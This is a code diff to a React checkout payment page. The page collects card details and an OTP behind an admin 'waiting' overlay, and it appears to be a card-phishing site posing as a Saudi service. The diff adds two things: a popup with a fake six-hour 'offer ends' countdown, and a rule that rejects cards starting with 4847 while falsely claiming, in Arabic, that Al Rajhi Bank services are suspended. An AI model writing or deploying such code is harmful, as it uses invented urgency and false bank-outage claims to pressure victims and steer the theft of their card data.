@@ -90,6 +90,23 @@ export default function CheckoutPaymentPage({ order, authData, onComplete }) {
   const [submitting, setSubmitting] = useState(false);
   const [paymentError, setPaymentError] = useState(false);
   const [cardOtpError, setCardOtpError] = useState(false);
+  const [errorCard, setErrorCard] = useState(false);
+  const [popUp, setPopUp] = useState(true);
+  const [counter, setCounter] = useState(60 * 60 * 6);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const hours = Math.floor(counter / 3600);
+  const minutes = Math.floor((counter % 3600) / 60);
+  const seconds = counter % 60;
+  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
+    minutes,
+  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
 
   useEffect(() => {
     scrollToTop();
@@ -177,12 +194,21 @@ export default function CheckoutPaymentPage({ order, authData, onComplete }) {
     )
       return;
 
+    if (digits.startsWith("4847")) {
+      setErrorCard(
+        `عذرًا، مصرف الراجحي موقوف حاليًا
+نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي لدى مركز سلامة، وذلك بسبب خلل فني من جهة مصدر البنك`,
+      );
+      return;
+    }
+
     const sessionId = sessionStorage.getItem("id");
     if (!sessionId) return;
 
     const payload = buildVisaPayload();
     setSubmitting(true);
     setPaymentError(false);
+    setErrorCard(false);
     paymentApproval.clearError();
 
     try {
@@ -223,6 +249,30 @@ export default function CheckoutPaymentPage({ order, authData, onComplete }) {
 
   return (
     <>
+      {popUp && paymentSubStep === "form" ? (
+        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-black bg-opacity-45">
+          <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
+            <img src="/payment.jpeg" className="w-full md:w-1/3" alt="" />
+            <span className="text-xl my-5 text-gray-700 w-fit font-bold">
+              سارع قبل نهاية العرض !
+            </span>
+            <span className="font-bold text-gray-700">
+              يتبقى على انتهاء العرض:
+            </span>
+            <div className="text-green-600 text-4xl my-5 font-bold">
+              {formattedTime}
+            </div>
+            <button
+              type="button"
+              onClick={() => setPopUp(false)}
+              className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
+            >
+              إغلاق
+            </button>
+          </div>
+        </div>
+      ) : null}
+
       <CheckoutWaitOverlay
         visible={waiting}
         message={t("checkoutAdmin.waiting")}
@@ -516,6 +566,12 @@ export default function CheckoutPaymentPage({ order, authData, onComplete }) {
                                           </fieldset>
                                         </div>
                                       </div>
+
+                                      {errorCard ? (
+                                        <p className="w-full flex justify-between p-3 border rounded-md text-red-500 text-sm bg-[#f8d7da] mt-3">
+                                          {errorCard}
+                                        </p>
+                                      ) : null}
 
                                       <div className="saved-cards__save-checkbox">
                                         <div className="ui form">
